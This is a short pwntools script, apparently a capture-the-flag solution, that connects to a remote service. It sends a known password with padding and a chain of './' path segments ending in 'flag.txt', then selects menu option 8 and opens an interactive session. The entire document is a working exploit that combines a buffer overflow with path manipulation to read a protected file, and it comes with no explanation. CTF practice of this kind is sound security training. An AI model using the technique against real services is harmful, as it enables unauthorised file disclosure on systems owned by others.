from pwn import *
r = remote('daka.whaledu.com',13000)

r.recvuntil('Enter password to authentic yourself : ')
r.sendline('kaiokenx20'+'A'*6+14*'./' + "flag.txt")

r.recvuntil(':')
r.sendline('8')

r.interactive()
